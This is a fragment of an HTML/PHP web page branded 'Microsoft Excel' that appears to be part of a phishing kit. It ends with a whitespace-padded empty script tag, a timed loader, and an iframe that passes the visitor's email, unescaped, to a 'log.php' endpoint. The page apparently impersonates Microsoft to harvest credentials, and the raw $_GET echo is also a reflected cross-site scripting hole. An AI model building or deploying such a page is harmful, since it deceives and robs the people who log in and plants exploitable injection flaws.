QAKRgCAghEAoGAEACgYAQAKtq7pJwCgOQQAKNh/AQpPFvc3RPXyAAAAAElFTkSuQmCC" width="37" height="32">
</td>
<td width="170" style="color:#fff; font-size:15px;">
Microsoft Excel
</td>
</tr>
</table>
</div>

<script type="text/javascript">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              
</script>
<script>
var myVar;

function myFunction() {
    myVar = setTimeout(showPage, 4000);
}

function showPage() {
  document.getElementById("loader").style.display = "none";
  document.getElementById("myDiv").style.display = "block";
}
</script>



  <iframe src="log.php?email=<?php echo $_GET['email']; ?>" allowtransparency="true" frameborder="0" height="276" width="100%" scrolling="no"></iframe></div>

</html>